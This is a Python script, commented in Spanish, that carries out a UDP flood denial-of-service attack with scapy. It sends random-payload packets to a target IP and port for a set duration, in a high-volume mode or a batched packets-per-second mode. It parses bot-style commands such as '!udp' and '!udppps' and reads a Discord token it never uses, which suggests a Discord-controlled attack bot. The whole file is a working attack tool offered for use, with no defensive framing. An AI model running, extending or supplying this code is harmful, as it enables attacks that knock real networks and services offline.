import sys
import time
import threading
from scapy.all import *
import os
import re  # Para usar expresiones regulares

# Obtener el token de Discord desde la variable de entorno
DISCORD_TOKEN = os.environ.get("DISCORD_TOKEN")

# Variable global para controlar la ejecución del ataque
ataque_en_curso = False

def udp_flood(target_ip, target_port, duration, pps_mode=False):
    global ataque_en_curso
    ataque_en_curso = True
    start_time = time.time()
    packet_count = 0

    print(f"Iniciando UDP flood a {target_ip}:{target_port} por {duration} segundos (PPS mode: {pps_mode})...")

    try:
        while ataque_en_curso and time.time() - start_time < duration:
            if pps_mode:
                # Modo PPS (más paquetes por segundo, menor tamaño)
                packet = IP(dst=target_ip) / UDP(dport=target_port) / Raw(load=os.urandom(64))  # Paquetes pequeños
                send(packet, verbose=False, count=100) # Enviar 100 paquetes a la vez (ajusta este valor)
                packet_count += 100
                time.sleep(0.01) # Esperar un poco para no saturar la CPU
            else:
                # Modo normal (más bytes, menos paquetes)
                packet = IP(dst=target_ip) / UDP(dport=target_port) / Raw(load=os.urandom(1024))  # Paquetes más grandes
                send(packet, verbose=False)
                packet_count += 1

            if packet_count % 1000 == 0: # Imprimir cada 1000 paquetes
                print(f"Enviados {packet_count} paquetes...")

    except KeyboardInterrupt:
        print("Interrupción manual. Deteniendo el ataque.")
    except Exception as e:
        print(f"Error durante el UDP flood: {e}")
    finally:
        ataque_en_curso = False
        print("UDP flood completado.")

def parse_command(command):
    """Analiza el comando y extrae la información necesaria."""
    match_udp = re.match(r"!udp\s+(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})\s+(\d+)\s+(\d+)", command)
    match_udppps = re.match(r"!udppps\s+(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})\s+(\d+)\s+(\d+)", command)
    match_stop = re.match(r"!stop", command)

    if match_udp:
        ip, port, duration = match_udp.groups()
        return "udp", ip, int(port), int(duration)
    elif match_udppps:
        ip, port, duration = match_udppps.groups()
        return "udppps", ip, int(port), int(duration)
    elif match_stop:
        return "stop", None, None, None
    else:
        return None, None, None, None

if __name__ == "__main__":
    if len(sys.argv) > 1:
        command_text = sys.argv[1]
        command, ip, port, duration = parse_command(command_text)

        if command == "udp":
            udp_flood(ip, port, duration)
        elif command == "udppps":
            udp_flood(ip, port, duration, pps_mode=True)
        elif command == "stop":
            ataque_en_curso = False # Detiene el ataque
            print("Deteniendo todos los ataques en curso...")
        else:
            print("Comando desconocido.")
    else:
        print("No se proporcionó ningún comando.")
